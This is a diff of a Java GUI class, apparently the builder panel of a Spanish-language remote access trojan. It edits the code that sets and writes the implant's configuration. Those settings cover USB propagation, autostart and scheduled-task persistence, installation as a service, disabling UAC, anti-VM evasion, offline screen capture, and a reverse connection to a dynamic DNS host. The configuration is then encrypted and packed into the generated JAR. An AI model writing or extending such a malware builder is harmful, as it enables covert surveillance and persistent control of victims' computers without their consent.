@@ -58,7 +58,6 @@ public class CrearCliente extends JFrame {
     private JFileChooser cd = new JFileChooser();
     private JButton btnCrearServer;
     private JButton btnGuardarPerfiles;
-
     private ConexionPanel panConexion;
     private CifradoPanel panelCifrado;
     private InstalarPanel panelInstalar;
@@ -67,21 +66,15 @@ public class CrearCliente extends JFrame {
     private FuncionesPanel panelOpciones;
     private PluginsPanel panelPlugins;
     private AntiVMPanel panelANTIVM;
-
     private JPanel panelPerfil;
-
     private JPanel panelConstruir;
-
     private JPanel panelBinder;
-
     private JTabbedPane tabs;
-
     private JTable tblPerfiles;
     private JScrollPane scrollTablaPerfiles;
     private List<Perfil> perfiles;
     private Perfil perfil;
     private JTextArea logServer;
-
     private JScrollPane scrollTablaAdjuntos;
     private JTable tblAdjuntos;
     private List<Archivo> listaAdjuntos;// archivos ser incrustados en el servidor
@@ -125,7 +118,6 @@ public class CrearCliente extends JFrame {
     public void agregarPerfil() {
         String nombre = JOptionPane.showInputDialog(this, "Nombre del perfil:");
         Perfil perfilNuevo = new Perfil();
-
         perfilNuevo.agregarParametro("nombre", nombre);
         perfilNuevo.agregarParametro("nombre_usb", "nombre_a_copiar_usb");
         perfilNuevo.agregarParametro("autoinicio", "true");
@@ -135,8 +127,8 @@ public class CrearCliente extends JFrame {
         perfilNuevo.agregarParametro("reg_name", nombre);
         perfilNuevo.agregarParametro("tipoConexion", ConexionServer.TCP);
         perfilNuevo.agregarParametro("ssl", "true");
-        perfilNuevo.agregarParametro("puerto1", "4001");
-        perfilNuevo.agregarParametro("puerto2", "4002");
+        perfilNuevo.agregarParametro("puerto", "4000");
+//        perfilNuevo.agregarParametro("puerto2", "4002");
         perfilNuevo.agregarParametro("prefijo", "serv_");
         perfilNuevo.agregarParametro("dns", "minoip.ddns.net");
         perfilNuevo.agregarParametro("clave_acceso", panelCifrado.generarClave());
@@ -267,8 +259,8 @@ public class CrearCliente extends JFrame {
             } catch (Exception e) {
 
             }
-            this.panConexion.getPuerto1().setValue(Integer.parseInt((String) p.obtenerParametro("puerto1")));
-            this.panConexion.getPuerto2().setValue(Integer.parseInt((String) p.obtenerParametro("puerto2")));
+            this.panConexion.getPuerto().setValue(Integer.parseInt((String) p.obtenerParametro("puerto")));
+//            this.panConexion.getPuerto2().setValue(Integer.parseInt((String) p.obtenerParametro("puerto2")));
             this.panConexion.getDelay().setValue(Integer.parseInt((String) p.obtenerParametro("delay")));
             this.panConexion.getConexionInversa().setSelected(Boolean.valueOf((String) p.obtenerParametro("inversa")));
 
@@ -316,8 +308,8 @@ public class CrearCliente extends JFrame {
 
         perfil.agregarParametro("tipoConexion", panConexion.getComboProtocolo().getSelectedIndex());
         perfil.agregarParametro("ssl", String.valueOf(panConexion.getChkSSL().isSelected()));
-        perfil.agregarParametro("puerto1", panConexion.getPuerto1().getValue().toString());
-        perfil.agregarParametro("puerto2", panConexion.getPuerto2().getValue().toString());
+        perfil.agregarParametro("puerto", panConexion.getPuerto().getValue().toString());
+//        perfil.agregarParametro("puerto2", panConexion.getPuerto2().getValue().toString());
         perfil.agregarParametro("delay", String.valueOf(panConexion.getDelay().getValue()));
 
         perfil.agregarParametro("usb", String.valueOf(panelPropagacion.getCheckUSB().isSelected()));
@@ -568,8 +560,8 @@ public class CrearCliente extends JFrame {
         cfg.agregarParametro("claveClase", this.panelCifrado.getKey().getText());
         cfg.agregarParametro("dns", panConexion.getTxtIpDNS().getText());
         cfg.agregarParametro("password", Encriptacion.MD5(new String(panConexion.getPassword().getPassword())));
-        cfg.agregarParametro("puerto1", Integer.valueOf(this.panConexion.getPuerto1().getValue().toString()));
-        cfg.agregarParametro("puerto2", Integer.valueOf(this.panConexion.getPuerto2().getValue().toString()));
+        cfg.agregarParametro("puerto", Integer.valueOf(this.panConexion.getPuerto().getValue().toString()));
+//        cfg.agregarParametro("puerto2", Integer.valueOf(this.panConexion.getPuerto2().getValue().toString()));
         cfg.agregarParametro("delay", panConexion.getDelay().getValue());
         cfg.agregarParametro("avmw", panelANTIVM.getAntiVM_windows().isSelected());
         cfg.agregarParametro("avml", panelANTIVM.getAntiVM_linux().isSelected());
@@ -577,7 +569,7 @@ public class CrearCliente extends JFrame {
         //configuracion de espiar
         //--escritorio
         cfg.agregarParametro("off-escritorio", this.panelEspiar.getCapturaOfflinePantalla().isSelected());
-        cfg.agregarParametro("off-escritorio-delay", this.panelEspiar.getDelayCapturaPantalla().getValue()*1000);
+        cfg.agregarParametro("off-escritorio-delay", this.panelEspiar.getDelayCapturaPantalla().getValue() * 1000);
         //--camara
 
         cfg.agregarParametro("tipoConexion", tipoConexion);
@@ -659,52 +651,6 @@ public class CrearCliente extends JFrame {
 
                 JarOutputStream salida = new JarOutputStream(fout, input.getManifest());
                 salida.setComment("--");
-//                Properties p = new Properties();
-//                p.put("prefijo", this.panConexion.getPrefijo().getText());
-//                p.put("claveClase", this.panelCifrado.getKey().getText());
-//                p.put("dns", panConexion.getTxtIpDNS().getText());
-//                p.put("password", Encriptacion.MD5(new String(panConexion.getPassword().getPassword())));
-//                p.put("puerto2", panConexion.getPuerto2().getValue().toString());
-//                p.put("puerto", this.panConexion.getPuerto1().getValue().toString());
-//                p.put("delay", new StringBuilder().append(panConexion.getDelay().getValue()).append("").toString());
-////                p.put("capDelay", "0");
-//                p.put("avmw", new StringBuilder().append("").append(panelANTIVM.getAntiVM_windows().isSelected()).toString());
-//                p.put("avml", new StringBuilder().append("").append(panelANTIVM.getAntiVM_linux().isSelected()).toString());
-////                p.put("capDuracion", "0");
-//                p.put("capturarEscritorio", String.valueOf(this.panelEspiar.getCapturaOfflinePantalla().isSelected()));
-//                p.put("capDelayFoto", new StringBuilder().append(this.panelEspiar.getDelayCapturaPantalla().getValue()).append("").toString());
-//                p.put("tipoConexion", tipoConexion);
-//                p.put("ssl", new StringBuilder().append("").append(panConexion.getChkSSL().isSelected()).toString());
-//                p.put("protocolo", protocolo);
-//                p.put("uac", String.valueOf(this.panelOpciones.getFn_desUAC().isSelected()));
-//                p.put("gui", String.valueOf(this.panelOpciones.getFn_Ventana().isSelected()));
-//                p.put("usb", new StringBuilder().append("").append(this.panelPropagacion.getCheckUSB().isSelected()).toString());
-//                if (this.panelPropagacion.getCheckUSB().isSelected()) {
-//                    p.put("nombreusb", this.panelPropagacion.getNombreUSB().getText());
-//                }
-//                p.put("instalar", new StringBuilder().append("").append(this.panelInstalar.getLblAutoInicio().isSelected()).toString());
-//
-//                //instala como servicio
-//                p.put("servicio", new StringBuilder().append("").append(panelInstalar.getServicio().isSelected()).toString());
-//
-//                if (this.panelInstalar.getLblAutoInicio().isSelected()) {
-//                    p.put("autoinicio", new StringBuilder().append("").append(this.panelInstalar.getAutoinicio().isSelected()).toString());
-//                    p.put("progtareas", new StringBuilder().append("").append(this.panelInstalar.getProgramadorTarea().isSelected()).toString());
-//                    p.put("regname", new StringBuilder().append("").append(this.panelInstalar.getRegName().getText()).toString());
-//                    p.put("jarname", new StringBuilder().append("").append(this.panelInstalar.getFilename().getText()).toString());
-//                }
-
-//                agregarLog("\tEscribiendo configuración en el cliente");
-//
-//                salida.putNextEntry(new JarEntry("param.dat"));
-//                ByteArrayOutputStream otmp1 = new ByteArrayOutputStream();
-//                p.storeToXML(otmp1, "---");
-//                otmp1.close();
-//                byte[] datosConfig;
-//                this.agregarLog("\tCifrando");
-//                datosConfig = DES.encriptDeS(passCifradoConfig, Compresor.comprimirGZIP(otmp1.toByteArray()));
-//                salida.write(datosConfig);
-//                salida.closeEntry();
                 //AGREGO ARCHIVO CONFIGURACION V2.0
                 try {
 
@@ -906,7 +852,6 @@ public class CrearCliente extends JFrame {
                 fout = null;
                 salida = null;
                 input = null;
-
                 agregarLog("=======================================================");
                 this.agregarLog(new StringBuilder().append("Cliente creado correctamente...\n").append(destino.getAbsolutePath()).toString());
                 this.agregarLog("Tamaño cliente:" + Util.convertirBytes(destino.length()));
@@ -923,7 +868,7 @@ public class CrearCliente extends JFrame {
 //        this.tabs.setTitleAt(0, rb.getString("servidor.conexion"));
 //        this.tabs.setTitleAt(1, rb.getString("servidor.autoinicio"));
 //        this.lblPassword.setText(rb.getString("servidor.contrasena"));
-//        this.lblPuerto1.setText(rb.getString("servidor.puerto1"));
+//        this.lblPuerto1.setText(rb.getString("servidor.puerto"));
 //        this.lblPuerto2.setText(rb.getString("servidor.puerto2"));
 //        this.btnCrearServer.setText(rb.getString("servidor.crear"));
 //        this.lblAutoInicio.setText(rb.getString("servidor.windows"));
@@ -1005,17 +950,6 @@ public class CrearCliente extends JFrame {
         return true;
     }
 
-    static class CeldaIcono extends DefaultTableCellRenderer {
-
-        @Override
-        public void setValue(Object value) {
-            try {
-                setIcon(Util.cargarIcono16("/resources/username.png"));
-            } catch (Exception e) {
-            }
-        }
-    }
-
     private void cifrarArchivo(File original, File destino) {
 
         try {
@@ -1095,6 +1029,17 @@ public class CrearCliente extends JFrame {
 
         } catch (IOException ex) {
             Logger.getLogger(CrearCliente.class.getName()).log(Level.SEVERE, null, ex);
+        }
+    }
+
+    static class CeldaIcono extends DefaultTableCellRenderer {
+
+        @Override
+        public void setValue(Object value) {
+            try {
+                setIcon(Util.cargarIcono16("/resources/username.png"));
+            } catch (Exception e) {
+            }
         }
     }
 
